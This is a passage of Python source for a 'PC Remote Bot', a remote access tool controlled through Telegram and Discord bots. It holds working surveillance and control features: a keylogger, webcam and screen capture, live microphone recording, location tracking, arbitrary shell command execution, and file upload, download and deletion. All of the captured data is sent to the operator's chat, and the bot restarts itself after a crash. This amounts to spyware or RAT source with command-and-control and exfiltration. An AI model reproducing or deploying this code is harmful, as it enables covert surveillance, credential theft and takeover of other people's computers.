        safe_post(f"{BASE_URL}/sendMessage", data={"chat_id": CHAT_ID, "text": text})

    def tg_send_photo(path, delete_after=True):
        try:
            with open(path, "rb") as p:
                safe_post(f"{BASE_URL}/sendPhoto", data={"chat_id": CHAT_ID}, files={"photo": p})
            if delete_after and os.path.exists(path): os.remove(path)
        except Exception as e:
            tg_send(f"❌ Photo failed: {str(e)}")

    def tg_send_doc(path):
        with open(path, "rb") as d:
            safe_post(f"{BASE_URL}/sendDocument", data={"chat_id": CHAT_ID}, files={"document": d})

    def tg_send_image_bytes(img_bytes, filename):
        safe_post(f"{BASE_URL}/sendPhoto", data={"chat_id": CHAT_ID}, files={"photo": (filename, img_bytes, "image/jpeg")})

    def edit_message(chat_id, message_id, text, reply_markup=None):
        data = {"chat_id": chat_id, "message_id": message_id, "text": text}
        if reply_markup: data["reply_markup"] = json.dumps(reply_markup)
        safe_post(f"{BASE_URL}/editMessageText", json=data)

    def tg_set_selected(pc_name):
        global SELECTED_PC
        SELECTED_PC = pc_name

    def is_selected():
        return SELECTED_PC == PC_NAME

    def heartbeat():
        while True:
            active_devices[PC_NAME] = time.time()
            time.sleep(60)

    def build_device_keyboard():
        buttons = []
        for name, last_seen in active_devices.items():
            status = "🟢" if time.time() - last_seen < 120 else "🔴"
            buttons.append([{"text": f"{status} {name}", "callback_data": f"select_{name}"}])
        buttons.append([{"text": "🔄 Refresh", "callback_data": "refresh_devices"}])
        return {"inline_keyboard": buttons}

    def build_commands_keyboard(pc_name):
        return {"inline_keyboard": [
            [{"text":"📊 Status","callback_data":"cmd_status"},{"text":"📍 Location","callback_data":"cmd_track"}],
            [{"text":"📸 Screenshot","callback_data":"cmd_screenshot"},{"text":"📷 Webcam","callback_data":"cmd_webcam"}],
            [{"text":"🔒 Lock","callback_data":"cmd_lock"},{"text":"🔊 Alarm","callback_data":"cmd_alarm"}],
            [{"text":"🔴 Shutdown","callback_data":"cmd_shutdown"},{"text":"🔄 Restart","callback_data":"cmd_restart"}],
            [{"text":"🔉 Vol-","callback_data":"cmd_vol_down"},{"text":"🔇 Mute","callback_data":"cmd_vol_mute"},{"text":"🔊 Vol+","callback_data":"cmd_vol_up"},{"text":"🎚 Set","callback_data":"cmd_vol_set"}],
            [{"text":"☀️ Brightness","callback_data":"cmd_brightness"},{"text":"🗣 Say","callback_data":"cmd_say"}],
            [{"text":"💬 Popup","callback_data":"cmd_popup"},{"text":"❓ Ask","callback_data":"cmd_ask"}],
            [{"text":"⌨️ Keys RT","callback_data":"cmd_keylog_rt"},{"text":"📋 Keys Int","callback_data":"cmd_keylog_int"}],
            [{"text":"🎙 Record","callback_data":"cmd_record"},{"text":"🔴 Live Audio","callback_data":"cmd_liveaudio"}],
            [{"text":"🖥 Live Screen","callback_data":"cmd_livescreen"},{"text":"🛑 Stop All","callback_data":"cmd_stop"}],
            [{"text":"💻 Terminal","callback_data":"cmd_terminal"},{"text":"📁 Files","callback_data":"cmd_files"}],
            [{"text":"🔁 Auto Track","callback_data":"cmd_auto"},{"text":"⬅️ Back","callback_data":"show_devices"}]
        ]}

    def handle_callback(callback):
        global auto_tracking, live_screen_running, audio_recording
        query_id   = callback["id"]
        data       = callback["data"]
        chat_id    = str(callback["message"]["chat"]["id"])
        message_id = callback["message"]["message_id"]
        msg_time   = callback["message"].get("date", 0)

        if msg_time < BOT_START_TIME:
            safe_post(f"{BASE_URL}/answerCallbackQuery", data={"callback_query_id": query_id, "text": "⏰ Command expired", "show_alert": True})
            return
        if chat_id != CHAT_ID: return

        safe_post(f"{BASE_URL}/answerCallbackQuery", data={"callback_query_id": query_id})

        if data in ("show_devices", "refresh_devices"):
            active_devices[PC_NAME] = time.time()
            edit_message(chat_id, message_id, "🖥 Select a Device:", build_device_keyboard())
            return
        elif data.startswith("select_"):
            selected = data.replace("select_", "")
            tg_set_selected(selected)
            edit_message(chat_id, message_id, f"✅ Connected to: {selected}\nChoose a command:", build_commands_keyboard(selected))
            return

        if not is_selected():
            if len(active_devices) == 1: tg_set_selected(PC_NAME)
            else:
                safe_post(f"{BASE_URL}/answerCallbackQuery", data={"callback_query_id": query_id, "text": "⚠️ Select a PC first using /devices", "show_alert": True})
                return

        if   data=="cmd_status":     tg_send(get_status())
        elif data=="cmd_track":      tg_send(get_location())
        elif data=="cmd_screenshot": tg_send_photo(take_screenshot())
        elif data=="cmd_webcam":     tg_send_photo(take_webcam())
        elif data=="cmd_lock":       lock_pc(tg_send)
        elif data=="cmd_shutdown":   shutdown_pc(tg_send)
        elif data=="cmd_restart":    restart_pc(tg_send)
        elif data=="cmd_vol_up":     volume_up(tg_send)
        elif data=="cmd_vol_down":   volume_down(tg_send)
        elif data=="cmd_vol_mute":   volume_mute(tg_send)
        elif data=="cmd_alarm":      play_alarm(tg_send)
        elif data=="cmd_brightness": get_brightness(tg_send); tg_send("To set: /brightness 70")
        elif data=="cmd_say":        tg_send("🗣 Usage: /say <text>")
        elif data=="cmd_popup":      tg_send("💬 Usage: /notify <text>")
        elif data=="cmd_ask":        tg_send("❓ Usage: /ask <question>")
        elif data=="cmd_vol_set":    tg_send("🎚 Usage: /vol 60")
        elif data=="cmd_terminal":   tg_send("💻 Usage: /cmd <command>")
        elif data=="cmd_keylog_rt":  tg_send("⌨️ Usage: /keylog rt")
        elif data=="cmd_keylog_int": tg_send("📋 Usage: /keylog 5")
        elif data=="cmd_record":     tg_send("🎙 Usage: /record 30")
        elif data=="cmd_liveaudio":  tg_send("🔴 Usage: /liveaudio 60")
        elif data=="cmd_livescreen": tg_send("🖥 Usage: /livescreen 60 2")
        elif data=="cmd_files":
            username = os.environ.get("USERNAME","User")
            tg_send(f"📁 FILE MANAGER\n/ls C:\\Users\\{username}\\Desktop\n/upload C:\\file.pdf\n/download path (reply to file)\n/delete path\n/search name path")
        elif data=="cmd_auto":
            if not auto_tracking:
                auto_tracking = True
                threading.Thread(target=auto_track_fn, args=(tg_send,), daemon=True).start()
                tg_send("🔁 Auto tracking ON")
        elif data=="cmd_stop":
            auto_tracking       = False
            live_screen_running = False
            audio_recording     = False
            if IS_WINDOWS: winsound.PlaySound(None, winsound.SND_PURGE)
            tg_send("🛑 All stopped")

    def get_updates(offset=None):
        return safe_get(f"{BASE_URL}/getUpdates", params={"timeout": 30, "offset": offset}).json()

    # Register device
    active_devices[PC_NAME] = time.time()
    safe_post(f"{BASE_URL}/sendMessage", json={"chat_id": CHAT_ID, "text": f"✅ {PC_NAME} is Online! (Platform: {args.platform.upper()})", "reply_markup": build_device_keyboard()})
    threading.Thread(target=heartbeat, daemon=True).start()
    threading.Thread(target=listen_for_wake, args=(tg_send,), daemon=True).start()

    last_update_id = None
    while True:
        try:
            updates = get_updates(last_update_id)
            for u in updates.get("result", []):
                last_update_id = u["update_id"] + 1
                try:
                    if "callback_query" in u:
                        handle_callback(u["callback_query"]); continue

                    msg      = u.get("message", {})
                    chat_id  = str(msg.get("chat", {}).get("id"))
                    text     = msg.get("text", "") or ""
                    msg_time = msg.get("date", 0)

                    if chat_id != CHAT_ID: continue
                    if msg_time < BOT_START_TIME: continue
                    if text not in ("/devices","/start","/help"):
                        if not is_selected():
                            if len(active_devices) == 1: tg_set_selected(PC_NAME)
                            else: tg_send("⚠️ Select a PC first: /devices"); continue

                    if   text.startswith("/say "):      threading.Thread(target=say_text, args=(text[5:].strip(), tg_send), daemon=True).start()
                    elif text.startswith("/notify "):   threading.Thread(target=show_popup, args=(text[8:].strip(), tg_send), daemon=True).start()
                    elif text.startswith("/ask "):      threading.Thread(target=show_toast_with_reply, args=(text[5:].strip(), tg_send), daemon=True).start()
                    elif text == "/shutdown":           shutdown_pc(tg_send)
                    elif text == "/restart":            restart_pc(tg_send)
                    elif text == "/lock":               lock_pc(tg_send)
                    elif text == "/volume up":          volume_up(tg_send)
                    elif text == "/volume down":        volume_down(tg_send)
                    elif text == "/volume mute":        volume_mute(tg_send)
                    elif text.startswith("/volume "):   volume_set(text.split(" ")[1], tg_send)
                    elif text.startswith("/vol "):
                        try:
                            level = int(text.split(" ")[1])
                            volume_set(level, tg_send) if 0<=level<=100 else tg_send("❌ Enter 0-100")
                        except: tg_send("❌ Usage: /vol 60")
                    elif text == "/brightness":         get_brightness(tg_send)
                    elif text.startswith("/brightness "): set_brightness(text.split(" ")[1], tg_send)
                    elif text.startswith("/ls"):        list_files(text[3:].strip() or os.getcwd(), tg_send)
                    elif text.startswith("/upload "):   threading.Thread(target=lambda p: (tg_send(f"📤 Uploading..."), tg_send_doc(p), tg_send("✅ Done!")), args=(text[8:].strip(),), daemon=True).start()
                    elif text.startswith("/delete "):   delete_file(text[8:].strip(), tg_send)
                    elif text.startswith("/search "):
                        parts = text[8:].strip().split(" ", 1)
                        threading.Thread(target=search_files, args=(parts[0], parts[1] if len(parts)>1 else "C:\\", tg_send), daemon=True).start()
                    elif text.startswith("/download"):
                        save_path = text[9:].strip() or os.getcwd()
                        reply = msg.get("reply_to_message", {})
                        doc   = reply.get("document") or reply.get("photo", [{}])[-1]
                        if doc:
                            def dl(fid, sp):
                                res = safe_get(f"{BASE_URL}/getFile", params={"file_id": fid}).json()
                                fp  = res["result"]["file_path"]
                                data_bytes = safe_get(f"https://api.telegram.org/file/bot{TELEGRAM_TOKEN}/{fp}").content
                                if os.path.isdir(sp): sp = os.path.join(sp, fp.split("/")[-1])
                                with open(sp, "wb") as f: f.write(data_bytes)
                                tg_send(f"✅ Saved: {sp}")
                            threading.Thread(target=dl, args=(doc.get("file_id"), save_path), daemon=True).start()
                        else: tg_send("❌ Reply to a file with /download <path>")
                    elif text.startswith("/cmd "):
                        tg_send(f"⚙️ Running on {PC_NAME}: {text[5:].strip()}")
                        tg_send(f"💻 [{PC_NAME}]\n{run_terminal_command(text[5:].strip())}")
                    elif text == "/keylog rt":
                        if not keylog_running: threading.Thread(target=start_realtime_keylog, args=(tg_send,), daemon=True).start()
                        else: tg_send("⚠️ Already running! /stopkey first")
                    elif text.startswith("/keylog "):
                        try:
                            mins = int(text.split(" ")[1])
                            if not keylog_running: threading.Thread(target=start_interval_keylog, args=(mins, tg_send), daemon=True).start()
                            else: tg_send("⚠️ Already running!")
                        except: tg_send("❌ Usage: /keylog 5")
                    elif text == "/getkeys":
                        if keylog_running: send_keylog("📥 Keys on demand", tg_send)
                        else: tg_send("❌ Keylogger not running")
                    elif text == "/stopkey":
                        if keylog_running: send_keylog("📋 Final keys", tg_send); stop_keylogger(tg_send)
                        else: tg_send("❌ Not running")
                    elif text == "/savekeys":
                        if keylog_running: save_keylog_to_file(tg_send, tg_send_doc)
                        else: tg_send("❌ Not running")
                    elif text.startswith("/record"):
                        try:
                            dur = int(text.split(" ")[1]) if len(text.split(" "))>1 else 30
                            if not audio_recording: threading.Thread(target=record_audio, args=(dur, tg_send, tg_send_doc), daemon=True).start()
                            else: tg_send("⚠️ Already recording!")
                        except: tg_send("❌ Usage: /record 30")
                    elif text.startswith("/liveaudio"):
                        try:
                            dur = int(text.split(" ")[1]) if len(text.split(" "))>1 else 60
                            if not audio_recording: threading.Thread(target=live_audio_stream, args=(dur, tg_send, tg_send_doc), daemon=True).start()
                            else: tg_send("⚠️ Already recording!")
                        except: tg_send("❌ Usage: /liveaudio 60")
                    elif text == "/stopaudio":
                        audio_recording = False
                        tg_send("🛑 Audio stopped!")
                    elif text.startswith("/livescreen"):
                        try:
                            parts = text.split(" ")
                            dur  = int(parts[1]) if len(parts)>1 else 60
                            intv = int(parts[2]) if len(parts)>2 else 3
                            if not live_screen_running: threading.Thread(target=live_screen_capture, args=(dur, intv, tg_send, tg_send_image_bytes), daemon=True).start()
                            else: tg_send("⚠️ Already running!")
                        except: tg_send("❌ Usage: /livescreen 60 3")
                    elif text == "/stopscreen":
                        live_screen_running = False
                        tg_send("🛑 Live screen stopped!")
                    elif text == "/devices":
                        active_devices[PC_NAME] = time.time()
                        safe_post(f"{BASE_URL}/sendMessage", json={"chat_id": CHAT_ID, "text": "🖥 Select a Device:", "reply_markup": build_device_keyboard()})
                    elif text == "/track":      tg_send(get_location())
                    elif text == "/status":     tg_send(get_status())
                    elif text == "/screenshot": tg_send_photo(take_screenshot())
                    elif text == "/webcam":     tg_send_photo(take_webcam())
                    elif text == "/alarm":      play_alarm(tg_send)
                    elif text == "/stop_alarm": stop_alarm(tg_send)
                    elif text == "/auto":
                        if not auto_tracking:
                            auto_tracking = True
                            threading.Thread(target=auto_track_fn, args=(tg_send,), daemon=True).start()
                            tg_send("🔁 Auto tracking ON")
                    elif text == "/stop":
                        auto_tracking = False
                        tg_send("🛑 Tracking OFF")
                    elif text in ("/start", "/help"):
                        tg_send(f"""📌 Commands — {PC_NAME}
🖥 /devices /status /lock /shutdown /restart
🔊 /vol 60 /volume up/down/mute /brightness 70 /say text
⌨️ /keylog rt /keylog 5 /getkeys /savekeys /stopkey
🎙 /record 30 /liveaudio 60 /stopaudio
🖥 /livescreen 60 3 /stopscreen
🔔 /notify text /ask question
📁 /ls /upload /download /delete /search
📸 /screenshot /webcam
💻 /cmd command
📍 /track /auto /stop
🔊 /alarm /stop_alarm""")
                except Exception as e:
                    print(f"⚠️ TG error: {e}")
        except Exception as e:
            print(f"⚠️ TG loop error: {e}")
            time.sleep(5)
        time.sleep(2)

# ================================================================
# DISCORD BOT
# ================================================================
def run_discord_bot():
    if not DISCORD_AVAILABLE or not DISCORD_TOKEN or not CHANNEL_ID:
        return

    global auto_tracking, live_screen_running, audio_recording

    intents = discord.Intents.default()
    intents.message_content = True
    bot = commands.Bot(command_prefix="/", intents=intents, help_command=None)

    async def dc_send(text):
        channel = bot.get_channel(CHANNEL_ID)
        if channel:
            if len(text) > 2000: text = text[:2000] + "...(truncated)"
            await channel.send(text)

    def dc_send_sync(text):
        import asyncio
        asyncio.run_coroutine_threadsafe(dc_send(text), bot.loop)

    async def dc_send_file(path):
        channel = bot.get_channel(CHANNEL_ID)
        if channel and os.path.exists(path):
            await channel.send(file=discord.File(path))

    def dc_send_file_sync(path):
        import asyncio
        asyncio.run_coroutine_threadsafe(dc_send_file(path), bot.loop)

    async def dc_send_image_bytes_async(img_bytes, filename):
        channel = bot.get_channel(CHANNEL_ID)
        if channel:
            await channel.send(file=discord.File(img_bytes, filename=filename))

    def dc_send_image_bytes_sync(img_bytes, filename):
        import asyncio
        asyncio.run_coroutine_threadsafe(dc_send_image_bytes_async(img_bytes, filename), bot.loop)

    @bot.event
    async def on_ready():
        channel = bot.get_channel(CHANNEL_ID)
        if channel:
            await channel.send(f"✅ **{PC_NAME}** is Online! (Discord Mode)\nType `/help` for commands")
        print(f"Discord bot ready: {bot.user}")
        threading.Thread(target=listen_for_wake, args=(dc_send_sync,), daemon=True).start()

    def check_selected(ctx):
        global SELECTED_PC
        if SELECTED_PC is None:
            if len(active_devices) == 1: SELECTED_PC = PC_NAME
        return SELECTED_PC == PC_NAME

    @bot.command(name="devices")
    async def dc_devices(ctx):
        active_devices[PC_NAME] = time.time()
        msg = "🖥 **Connected PCs:**\n"
        for name, last_seen in active_devices.items():
            status = "🟢" if time.time()-last_seen<120 else "🔴"
            msg   += f"{status} {name}\n"
        msg += "\nUse `/select <PC_NAME>` to select a PC"
        await ctx.send(msg)

    @bot.command(name="select")
    async def dc_select(ctx, *, pc_name):
        global SELECTED_PC
        SELECTED_PC = pc_name
        await ctx.send(f"✅ Selected: **{pc_name}**")

    @bot.command(name="status")
    async def dc_status(ctx):
        if not check_selected(ctx): await ctx.send("⚠️ Select a PC first: `/devices`"); return
        await ctx.send(get_status())

    @bot.command(name="screenshot")
    async def dc_screenshot(ctx):
        if not check_selected(ctx): await ctx.send("⚠️ Select a PC first"); return
        path = take_screenshot()
        await ctx.send(file=discord.File(path))
        os.remove(path)

    @bot.command(name="webcam")
    async def dc_webcam(ctx):
        if not check_selected(ctx): await ctx.send("⚠️ Select a PC first"); return
        path = take_webcam()
        await ctx.send(file=discord.File(path))
        os.remove(path)

    @bot.command(name="livescreen")
    async def dc_livescreen(ctx, duration: int=60, interval: int=3):
        if not check_selected(ctx): await ctx.send("⚠️ Select a PC first"); return
        if live_screen_running: await ctx.send("⚠️ Already running! `/stopscreen`"); return

        async def send_img(img_bytes, filename):
            await ctx.send(file=discord.File(img_bytes, filename=filename))

        threading.Thread(
            target=live_screen_capture,
            args=(duration, interval, dc_send_sync, dc_send_image_bytes_sync),
            daemon=True
        ).start()

    @bot.command(name="stopscreen")
    async def dc_stopscreen(ctx):
        global live_screen_running
        live_screen_running = False
        await ctx.send("🛑 Live screen stopped!")

    @bot.command(name="lock")
    async def dc_lock(ctx):
        if not check_selected(ctx): await ctx.send("⚠️ Select a PC first"); return
        lock_pc(dc_send_sync)

    @bot.command(name="shutdown")
    async def dc_shutdown(ctx):
        if not check_selected(ctx): await ctx.send("⚠️ Select a PC first"); return
        shutdown_pc(dc_send_sync)

    @bot.command(name="restart")
    async def dc_restart(ctx):
        if not check_selected(ctx): await ctx.send("⚠️ Select a PC first"); return
        restart_pc(dc_send_sync)

    @bot.command(name="cmd")
    async def dc_cmd(ctx, *, command):
        if not check_selected(ctx): await ctx.send("⚠️ Select a PC first"); return
        await ctx.send(f"⚙️ Running: `{command}`")
        result = run_terminal_command(command)
        if len(result) > 1900: result = result[:1900] + "..."
        await ctx.send(f"```\n{result}\n```")

    @bot.command(name="track")
    async def dc_track(ctx):
        if not check_selected(ctx): await ctx.send("⚠️ Select a PC first"); return
        await ctx.send(get_location())

    @bot.command(name="vol")
    async def dc_vol(ctx, level: int):
        if not check_selected(ctx): await ctx.send("⚠️ Select a PC first"); return
        volume_set(level, dc_send_sync)

    @bot.command(name="brightness")
    async def dc_brightness(ctx, level: int=None):
        if not check_selected(ctx): await ctx.send("⚠️ Select a PC first"); return
        if level: set_brightness(level, dc_send_sync)
        else: get_brightness(dc_send_sync)

    @bot.command(name="say")
    async def dc_say(ctx, *, text):
        if not check_selected(ctx): await ctx.send("⚠️ Select a PC first"); return
        threading.Thread(target=say_text, args=(text, dc_send_sync), daemon=True).start()

    @bot.command(name="notify")
    async def dc_notify(ctx, *, text):
        if not check_selected(ctx): await ctx.send("⚠️ Select a PC first"); return
        threading.Thread(target=show_popup, args=(text, dc_send_sync), daemon=True).start()

    @bot.command(name="ls")
    async def dc_ls(ctx, *, path=""):
        if not check_selected(ctx): await ctx.send("⚠️ Select a PC first"); return
        list_files(path or os.getcwd(), dc_send_sync)

    @bot.command(name="upload")
    async def dc_upload(ctx, *, path):
        if not check_selected(ctx): await ctx.send("⚠️ Select a PC first"); return
        if not os.path.exists(path): await ctx.send(f"❌ Not found: {path}"); return
        size = os.path.getsize(path)
        if size > 8*1024*1024: await ctx.send("❌ File too large (Discord 8MB limit)"); return
        await ctx.send(f"📤 Uploading...", file=discord.File(path))

    @bot.command(name="delete")
    async def dc_delete(ctx, *, path):
        if not check_selected(ctx): await ctx.send("⚠️ Select a PC first"); return
        delete_file(path, dc_send_sync)

    @bot.command(name="search")
    async def dc_search(ctx, filename: str, path: str="C:\\"):
        if not check_selected(ctx): await ctx.send("⚠️ Select a PC first"); return
        threading.Thread(target=search_files, args=(filename, path, dc_send_sync), daemon=True).start()

    @bot.command(name="alarm")
    async def dc_alarm(ctx):
        if not check_selected(ctx): await ctx.send("⚠️ Select a PC first"); return
        play_alarm(dc_send_sync)

    @bot.command(name="stop_alarm")
    async def dc_stop_alarm(ctx):
        if not check_selected(ctx): await ctx.send("⚠️ Select a PC first"); return
        stop_alarm(dc_send_sync)

    @bot.command(name="keylog")
    async def dc_keylog(ctx, mode: str="rt"):
        if not check_selected(ctx): await ctx.send("⚠️ Select a PC first"); return
        if keylog_running: await ctx.send("⚠️ Already running! `/stopkey`"); return
        if mode == "rt":
            threading.Thread(target=start_realtime_keylog, args=(dc_send_sync,), daemon=True).start()
        else:
            try:
                mins = int(mode)
                threading.Thread(target=start_interval_keylog, args=(mins, dc_send_sync), daemon=True).start()
            except: await ctx.send("❌ Usage: `/keylog rt` or `/keylog 5`")

    @bot.command(name="getkeys")
    async def dc_getkeys(ctx):
        if not check_selected(ctx): await ctx.send("⚠️ Select a PC first"); return
        if keylog_running: send_keylog("📥 Keys on demand", dc_send_sync)
        else: await ctx.send("❌ Keylogger not running")

    @bot.command(name="stopkey")
    async def dc_stopkey(ctx):
        if not check_selected(ctx): await ctx.send("⚠️ Select a PC first"); return
        if keylog_running: send_keylog("📋 Final keys", dc_send_sync); stop_keylogger(dc_send_sync)
        else: await ctx.send("❌ Not running")

    @bot.command(name="record")
    async def dc_record(ctx, duration: int=30):
        if not check_selected(ctx): await ctx.send("⚠️ Select a PC first"); return
        if not audio_recording:
            threading.Thread(target=record_audio, args=(duration, dc_send_sync, dc_send_file_sync), daemon=True).start()
        else: await ctx.send("⚠️ Already recording!")

    @bot.command(name="liveaudio")
    async def dc_liveaudio(ctx, duration: int=60):
        if not check_selected(ctx): await ctx.send("⚠️ Select a PC first"); return
        if not audio_recording:
            threading.Thread(target=live_audio_stream, args=(duration, dc_send_sync, dc_send_file_sync), daemon=True).start()
        else: await ctx.send("⚠️ Already recording!")

    @bot.command(name="stopaudio")
    async def dc_stopaudio(ctx):
        global audio_recording
        audio_recording = False
        await ctx.send("🛑 Audio stopped!")

    @bot.command(name="auto")
    async def dc_auto(ctx):
        global auto_tracking
        if not check_selected(ctx): await ctx.send("⚠️ Select a PC first"); return
        if not auto_tracking:
            auto_tracking = True
            threading.Thread(target=auto_track_fn, args=(dc_send_sync,), daemon=True).start()
            await ctx.send("🔁 Auto tracking ON")
        else: await ctx.send("Already running!")

    @bot.command(name="stop")
    async def dc_stop(ctx):
        global auto_tracking
        auto_tracking = False
        await ctx.send("🛑 Tracking OFF")

    @bot.command(name="help")
    async def dc_help(ctx):
        await ctx.send(f"""**📌 PC Remote Bot — {PC_NAME}**

🖥 **System:**
`/devices` `/select <name>` `/status` `/lock` `/shutdown` `/restart`

📸 **Media:**
`/screenshot` `/webcam`
`/livescreen [duration] [interval]` `/stopscreen`

📁 **Files:**
`/ls [path]` `/upload <path>` `/delete <path>` `/search <name> [path]`

💻 **Terminal:**
`/cmd <command>`

🔊 **Audio & Display:**
`/vol <0-100>` `/brightness [level]` `/say <text>` `/alarm` `/stop_alarm`

🎙 **Recording:**
`/record [seconds]` `/liveaudio [seconds]` `/stopaudio`

⌨️ **Keylogger:**
`/keylog rt` `/keylog <mins>` `/getkeys` `/stopkey`

🔔 **Notifications:**
`/notify <text>`

📍 **Location:**
`/track` `/auto` `/stop`""")

    try:
        bot.run(DISCORD_TOKEN, reconnect = True)
    except Exception as e:
        print(f"Discord error: {e}")
        raise

# ================================================================
# MAIN - RUN SELECTED PLATFORM(S)
# ================================================================
import asyncio

print()
print(f"  PC Remote Bot")
print(f"  Platform : {args.platform.upper()}")
print(f"  System   : {args.system.upper()}")
print(f"  PC Name  : {PC_NAME}")
print()

def run_telegram_thread():
    """Run Telegram in its own thread with its own loop"""
    try:
        run_telegram_bot()
    except Exception as e:
        print(f"Telegram error: {e}")
        time.sleep(5)
        run_telegram_thread()  # Restart on crash

def run_discord_thread():
    """Run Discord in its own thread with its own event loop"""
    try:
        # ✅ Fix: Create new event loop for this thread
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        run_discord_bot()
    except Exception as e:
        print(f"Discord error: {e}")
        time.sleep(5)
        run_discord_thread()  # Restart on crash

if args.platform == "telegram":
    print("  Starting Telegram bot...")
    while True:
        try:
            run_telegram_bot()
        except Exception as e:
            print(f"Restart after error: {e}")
            time.sleep(5)

elif args.platform == "discord":
    print("  Starting Discord bot...")
    while True:
        try:
            # ✅ Fix: Set event loop policy for Windows exe
            if sys.platform == "win32":
                asyncio.set_event_loop_policy(
                    asyncio.WindowsSelectorEventLoopPolicy()
                )
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            run_discord_bot()
        except Exception as e:
            print(f"Restart after error: {e}")
            time.sleep(5)

elif args.platform == "both":
    print("  Starting both Telegram + Discord...")

    # ✅ Telegram in background thread
    tg_thread = threading.Thread(target=run_telegram_thread, daemon=False)
    tg_thread.start()

    # ✅ Discord in main thread with proper event loop
    while True:
        try:
            if sys.platform == "win32":
                asyncio.set_event_loop_policy(
                    asyncio.WindowsSelectorEventLoopPolicy()
                )
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            run_discord_bot()
        except Exception as e:
            print(f"Discord restart: {e}")
            time.sleep(5)